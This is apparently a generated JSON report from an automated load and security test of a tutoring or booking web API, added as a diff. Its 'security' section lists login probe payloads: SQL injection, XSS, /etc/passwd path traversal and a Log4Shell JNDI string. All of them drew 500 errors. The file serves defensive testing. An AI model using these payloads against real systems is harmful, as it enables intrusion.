@@ -1,0 +1,386 @@
+{
+  "run_started_epoch": 1772069310.4121065,
+  "api_baseline": [
+    {
+      "name": "health",
+      "path": "/health",
+      "method": "GET",
+      "status": 200,
+      "duration_ms": 2.38
+    },
+    {
+      "name": "auth_me",
+      "path": "/auth/me",
+      "method": "GET",
+      "status": 401,
+      "duration_ms": 2.63
+    },
+    {
+      "name": "auth_select_role",
+      "path": "/auth/select-role",
+      "method": "POST",
+      "status": 401,
+      "duration_ms": 2.05
+    },
+    {
+      "name": "student_availability",
+      "path": "/student/availability",
+      "method": "GET",
+      "status": 401,
+      "duration_ms": 2.09
+    },
+    {
+      "name": "student_availability_summary",
+      "path": "/student/availability/summary",
+      "method": "GET",
+      "status": 401,
+      "duration_ms": 2.13
+    },
+    {
+      "name": "student_bookings_get",
+      "path": "/student/bookings",
+      "method": "GET",
+      "status": 401,
+      "duration_ms": 2.58
+    },
+    {
+      "name": "student_bookings_create",
+      "path": "/student/bookings",
+      "method": "POST",
+      "status": 401,
+      "duration_ms": 3.39
+    },
+    {
+      "name": "contact_messages",
+      "path": "/contact-messages",
+      "method": "POST",
+      "status": 422,
+      "duration_ms": 1.98
+    },
+    {
+      "name": "teacher_bookings",
+      "path": "/teacher/bookings",
+      "method": "GET",
+      "status": 401,
+      "duration_ms": 2.97
+    },
+    {
+      "name": "teacher_students",
+      "path": "/teacher/students",
+      "method": "GET",
+      "status": 401,
+      "duration_ms": 2.6
+    },
+    {
+      "name": "teacher_booking_status",
+      "path": "/teacher/bookings/1/status",
+      "method": "PATCH",
+      "status": 401,
+      "duration_ms": 2.2
+    },
+    {
+      "name": "admin_messages",
+      "path": "/admin/messages",
+      "method": "GET",
+      "status": 401,
+      "duration_ms": 2.51
+    },
+    {
+      "name": "admin_teachers",
+      "path": "/admin/teachers",
+      "method": "GET",
+      "status": 401,
+      "duration_ms": 2.57
+    },
+    {
+      "name": "admin_venues",
+      "path": "/admin/venues",
+      "method": "GET",
+      "status": 401,
+      "duration_ms": 1.99
+    },
+    {
+      "name": "admin_syllabus",
+      "path": "/admin/syllabus",
+      "method": "GET",
+      "status": 401,
+      "duration_ms": 2.62
+    },
+    {
+      "name": "admin_bookings",
+      "path": "/admin/bookings",
+      "method": "GET",
+      "status": 401,
+      "duration_ms": 2.91
+    },
+    {
+      "name": "admin_users",
+      "path": "/admin/users",
+      "method": "GET",
+      "status": 401,
+      "duration_ms": 2.15
+    },
+    {
+      "name": "meta_programs",
+      "path": "/meta/programs",
+      "method": "GET",
+      "status": 200,
+      "duration_ms": 2.46
+    },
+    {
+      "name": "admin_students",
+      "path": "/admin/students",
+      "method": "GET",
+      "status": 401,
+      "duration_ms": 2.57
+    }
+  ],
+  "api_load": [
+    {
+      "name": "health",
+      "path": "/health",
+      "method": "GET",
+      "status": 200,
+      "duration_ms": 7.47,
+      "ok": true
+    },
+    {
+      "name": "auth_me",
+      "path": "/auth/me",
+      "method": "GET",
+      "status": 401,
+      "duration_ms": 7.17,
+      "ok": true
+    },
+    {
+      "name": "auth_select_role",
+      "path": "/auth/select-role",
+      "method": "POST",
+      "status": 401,
+      "duration_ms": 6.6,
+      "ok": true
+    },
+    {
+      "name": "student_availability",
+      "path": "/student/availability",
+      "method": "GET",
+      "status": 401,
+      "duration_ms": 7.83,
+      "ok": true
+    },
+    {
+      "name": "student_bookings_get",
+      "path": "/student/bookings",
+      "method": "GET",
+      "status": 401,
+      "duration_ms": 8.22,
+      "ok": true
+    },
+    {
+      "name": "student_availability_summary",
+      "path": "/student/availability/summary",
+      "method": "GET",
+      "status": 401,
+      "duration_ms": 9.72,
+      "ok": true
+    },
+    {
+      "name": "contact_messages",
+      "path": "/contact-messages",
+      "method": "POST",
+      "status": 422,
+      "duration_ms": 8.67,
+      "ok": true
+    },
+    {
+      "name": "student_bookings_create",
+      "path": "/student/bookings",
+      "method": "POST",
+      "status": 401,
+      "duration_ms": 14.22,
+      "ok": true
+    },
+    {
+      "name": "teacher_students",
+      "path": "/teacher/students",
+      "method": "GET",
+      "status": 401,
+      "duration_ms": 10.29,
+      "ok": true
+    },
+    {
+      "name": "teacher_booking_status",
+      "path": "/teacher/bookings/1/status",
+      "method": "PATCH",
+      "status": 401,
+      "duration_ms": 7.78,
+      "ok": true
+    },
+    {
+      "name": "teacher_bookings",
+      "path": "/teacher/bookings",
+      "method": "GET",
+      "status": 401,
+      "duration_ms": 14.77,
+      "ok": true
+    },
+    {
+      "name": "admin_messages",
+      "path": "/admin/messages",
+      "method": "GET",
+      "status": 401,
+      "duration_ms": 8.83,
+      "ok": true
+    },
+    {
+      "name": "admin_venues",
+      "path": "/admin/venues",
+      "method": "GET",
+      "status": 401,
+      "duration_ms": 8.92,
+      "ok": true
+    },
+    {
+      "name": "admin_teachers",
+      "path": "/admin/teachers",
+      "method": "GET",
+      "status": 401,
+      "duration_ms": 12.02,
+      "ok": true
+    },
+    {
+      "name": "admin_syllabus",
+      "path": "/admin/syllabus",
+      "method": "GET",
+      "status": 401,
+      "duration_ms": 10.31,
+      "ok": true
+    },
+    {
+      "name": "admin_bookings",
+      "path": "/admin/bookings",
+      "method": "GET",
+      "status": 401,
+      "duration_ms": 11.52,
+      "ok": true
+    },
+    {
+      "name": "meta_programs",
+      "path": "/meta/programs",
+      "method": "GET",
+      "status": 200,
+      "duration_ms": 6.17,
+      "ok": true
+    },
+    {
+      "name": "admin_users",
+      "path": "/admin/users",
+      "method": "GET",
+      "status": 401,
+      "duration_ms": 8.68,
+      "ok": true
+    },
+    {
+      "name": "admin_students",
+      "path": "/admin/students",
+      "method": "GET",
+      "status": 401,
+      "duration_ms": 8.94,
+      "ok": true
+    }
+  ],
+  "security": [
+    {
+      "type": "login_attack",
+      "payload_preview": "' OR '1'='1",
+      "status": 500,
+      "duration_ms": 21.55,
+      "accepted": true
+    },
+    {
+      "type": "login_attack",
+      "payload_preview": "' UNION SELECT 1,2,3 --",
+      "status": 500,
+      "duration_ms": 22.71,
+      "accepted": true
+    },
+    {
+      "type": "login_attack",
+      "payload_preview": "admin@example.com'/*",
+      "status": 500,
+      "duration_ms": 27.14,
+      "accepted": true
+    },
+    {
+      "type": "login_attack",
+      "payload_preview": "<script>alert(1)</script>@x.com",
+      "status": 500,
+      "duration_ms": 23.43,
+      "accepted": true
+    },
+    {
+      "type": "login_attack",
+      "payload_preview": "\" onfocus=\"alert(1)\"@x.com",
+      "status": 500,
+      "duration_ms": 22.3,
+      "accepted": true
+    },
+    {
+      "type": "login_attack",
+      "payload_preview": "../../../../etc/passwd",
+      "status": 500,
+      "duration_ms": 21.11,
+      "accepted": true
+    },
+    {
+      "type": "login_attack",
+      "payload_preview": "${jndi:ldap://example.com/a}",
+      "status": 500,
+      "duration_ms": 23.16,
+      "accepted": true
+    },
+    {
+      "type": "login_attack",
+      "payload_preview": "\ud83d\ude00\ud83d\ude00\ud83d\ude00\ud83d\ude00\ud83d\ude00\ud83d\ude00\ud83d\ude00\ud83d\ude00\ud83d\ude00\ud83d\ude00\ud83d\ude00\ud83d\ude00\ud83d\ude00\ud83d\ude00\ud83d\ude00\ud83d\ude00\ud83d\ude00\ud83d\ude00\ud83d\ude00\ud83d\ude00\ud83d\ude00\ud83d\ude00\ud83d\ude00\ud83d\ude00\ud83d\ude00\ud83d\ude00\ud83d\ude00\ud83d\ude00\ud83d\ude00\ud83d\ude00\ud83d\ude00\ud83d\ude00\ud83d\ude00\ud83d\ude00\ud83d\ude00\ud83d\ude00\ud83d\ude00\ud83d\ude00\ud83d\ude00\ud83d\ude00",
+      "status": 500,
+      "duration_ms": 22.23,
+      "accepted": true
+    },
+    {
+      "type": "login_attack",
+      "payload_preview": "null-byte%00@test.com",
+      "status": 500,
+      "duration_ms": 21.94,
+      "accepted": true
+    },
+    {
+      "type": "login_attack",
+      "payload_preview": "admin@example.com",
+      "status": 500,
+      "duration_ms": 20.18,
+      "accepted": true
+    },
+    {
+      "type": "login_attack",
+      "payload_preview": "admin@example.com",
+      "status": 500,
+      "duration_ms": 21.42,
+      "accepted": true
+    },
+    {
+      "type": "login_attack",
+      "payload_preview": "",
+      "status": 422,
+      "duration_ms": 3.82,
+      "accepted": true
+    }
+  ],
+  "summary": {
+    "requests": 19,
+    "avg_ms": 9.38,
+    "p95_ms": 14.22,
+    "max_ms": 14.77,
+    "failures": 0
+  },
+  "run_finished_epoch": 1772069310.8710864
+}
